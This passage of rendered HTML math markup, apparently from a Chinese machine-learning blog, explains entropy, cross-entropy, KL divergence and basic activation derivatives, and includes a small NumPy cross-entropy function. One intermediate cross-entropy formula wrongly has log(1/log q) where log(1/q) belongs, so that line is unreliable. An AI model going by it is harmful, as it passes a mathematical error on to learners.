mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mclose">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2499259999999999em;vertical-align:-0.43581800000000004em;"></span><span class="mord mathdefault">λ</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span></span></span></span></span></p></li><li><p><strong>熵</strong>用于度量变量不确定性的程度：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mrow></mrow><annotation encoding="application/x-tex">H(X)=-\sum^{n}_{i=1}{p(x_i)\log{p(x_i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></span>，越大说明不确定性越高</p></li><li><p><strong>交叉熵</strong>用于度量两个概率分布间的差异性信息，越确信交叉熵越小</p></li><li><p>设 p(x),q(x) 分别是离散随机变量X的两个概率分布，其中p(x)是目标分布，p和q的交叉熵可以看做是，使用分布q(x) 表示目标分布p(x)的困难程度：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∑</mo><mi>i</mi></msub><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mfrac><mn>1</mn><mrow><mi>log</mi><mo>⁡</mo><mrow><mi>q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mrow></mfrac></mrow><mo>=</mo><mo>−</mo><msub><mo>∑</mo><mi>i</mi></msub><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mrow><mi>q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mrow></mrow><annotation encoding="application/x-tex">H(p,q)=\sum_i{p(x_i)\log{\frac{1}{\log{q(x_i)}}}}=-\sum_i{p(x_i)\log{q(x_i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></span></p></li><li><p><strong>交叉熵损失</strong>用于描述真实概率和模型预测概率的交叉熵</p></li><li><p>softmax得到预测的概率之后，把标签进行独热编码，再使用交叉熵损失函数优化模型。</p></li><li><p>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>完全匹配，交叉熵和熵的计算值相等。但其实交叉熵比在真实分布上计算出的熵具有更大的值，这种差异称为<code>Kullback-Leibler Divergence</code>。简称KL散度。度量两分布的差异：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mrow><mi>K</mi><mi>L</mi></mrow></msub><mo stretchy="false">(</mo><mi>P</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></msub><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mrow><mo>+</mo><msub><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></msub><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mrow><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D_{KL}(P||Q)=-\sum_{x\in X}{p(x)\log{q(x)}}+\sum_{x\in X}{p(x)\log{p(x)}}=H(P,Q)-H(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">K</span><span class="mord mathdefault mtight">L</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.07708em;vertical-align:-0.32708000000000004em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32708000000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.07708em;vertical-align:-0.32708000000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32708000000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></p></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cross_entropy_error</span>(<span class="params">y, t</span>):</span></span><br><span class="line">    delta = <span class="number">1e-7</span></span><br><span class="line">    <span class="keyword">return</span> -np.sum(t * np.log(y + delta))</span><br></pre></td></tr></table></figure><h2 id="导数计算"><a class="markdownIt-Anchor" href="#导数计算"></a> 导数计算</h2><table><thead><tr><th>方程</th><th>求导</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">f(x)=x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f&#x27;(x)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mi>i</mi><mi>f</mi><mi>x</mi><mo>&lt;</mo><mn>0</mn><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">f(x)=0 if x&lt;0 else 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">1</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f&#x27;(x)= 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>o</mi><mi>i</mi><mi>d</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><mi>exp</mi><mo>⁡</mo><mrow><mo>−</mo><mi>x</mi></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">f(x)=sigmoid(x)=\frac{1}{1+\exp{-x}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.326216em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f&#x27;(x)=f(x)(1-f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 